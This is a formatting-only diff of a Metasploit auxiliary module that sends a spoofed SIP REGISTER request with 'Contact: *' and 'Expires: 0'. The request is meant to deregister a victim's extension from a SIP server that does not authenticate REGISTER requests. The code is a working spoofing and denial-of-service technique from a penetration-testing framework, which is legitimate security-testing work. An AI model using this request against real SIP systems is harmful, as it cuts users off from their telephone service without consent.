@@ -9,31 +9,32 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'           => 'SIP Deregister Extension',
-      'Description'   => %q{
+      'Name' => 'SIP Deregister Extension',
+      'Description' => %q{
           This module will attempt to deregister a SIP user from the provider. It
         has been tested successfully when the sip provider/server doesn't use REGISTER
         authentication.
       },
-      'Author'         => [ 'ChrisJohnRiley' ],
-      'License'        =>  MSF_LICENSE
+      'Author' => [ 'ChrisJohnRiley' ],
+      'License' => MSF_LICENSE
     )
 
     deregister_udp_options
     register_options(
       [
         Opt::RPORT(5060),
-        OptString.new('SRCADDR', [true, "The sip address the spoofed deregister request is coming from",'192.168.1.1']),
+        OptString.new('SRCADDR', [true, "The sip address the spoofed deregister request is coming from", '192.168.1.1']),
         OptString.new('EXTENSION', [true, "The specific extension or name to target", '100']),
         OptString.new('DOMAIN', [true, "Use a specific SIP domain", 'example.com'])
-      ])
+      ]
+    )
     register_advanced_options(
       [
         OptAddress.new('SIP_PROXY_NAME', [false, "Use a specific SIP proxy", nil]),
         OptPort.new('SIP_PROXY_PORT', [false, "SIP Proxy port to use", 5060])
-      ])
+      ]
+    )
   end
-
 
   def setup
     # throw argument error if extension or domain contain spaces
@@ -45,9 +46,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run_host(ip)
-
     begin
-
       src = datastore['SRCADDR']
       ext = datastore['EXTENSION']
       dom = datastore['DOMAIN']
@@ -65,13 +64,13 @@ class MetasploitModule < Msf::Auxiliary
       print_status("Sending deregistration packet to: #{conn_string}")
       print_status("Using SIP proxy #{sphost}:#{spport}") if route
 
-      req =  "REGISTER sip:#{dom} SIP/2.0" + "\r\n"
+      req = "REGISTER sip:#{dom} SIP/2.0" + "\r\n"
       req << route if route
       req << "Via: SIP/2.0/UDP #{src}" + "\r\n"
-      req << "Max-Forwards: 70" +  "\r\n"
+      req << "Max-Forwards: 70" + "\r\n"
       req << "To: \"#{ext}\"<sip:#{conn_string}>" + "\r\n"
       req << "From: \"#{ext}\"<sip:#{conn_string}>" + "\r\n"
-      req << "Call-ID: #{(rand(100)+100)}#{ip}" + "\r\n"
+      req << "Call-ID: #{(rand(100) + 100)}#{ip}" + "\r\n"
       req << "CSeq: 1 REGISTER" + "\r\n"
       req << "Contact: *" + "\r\n"
       req << "Expires: 0" + "\r\n"
@@ -87,25 +86,23 @@ class MetasploitModule < Msf::Auxiliary
       # print error information if no response has been received
       # may be expected if spoofing the SRCADDR
       print_error("No response received from remote host") if not response
-
     rescue Errno::EACCES
     ensure
       disconnect_udp
     end
-
   end
 
   def parse_reply(pkt)
     # parse response to check if the ext was successfully de-registered
 
-    if(pkt[1] =~ /^::ffff:/)
+    if (pkt[1] =~ /^::ffff:/)
       pkt[1] = pkt[1].sub(/^::ffff:/, '')
     end
 
-    resp  = pkt[0].split(/\s+/)[1]
-    rhost,rport = pkt[1], pkt[2]
+    resp = pkt[0].split(/\s+/)[1]
+    rhost, rport = pkt[1], pkt[2]
 
-    if(pkt[0] =~ /^To\:\s*(.*)$/i)
+    if (pkt[0] =~ /^To\:\s*(.*)$/i)
       testn = "#{$1.strip}".split(';')[0]
     end
 
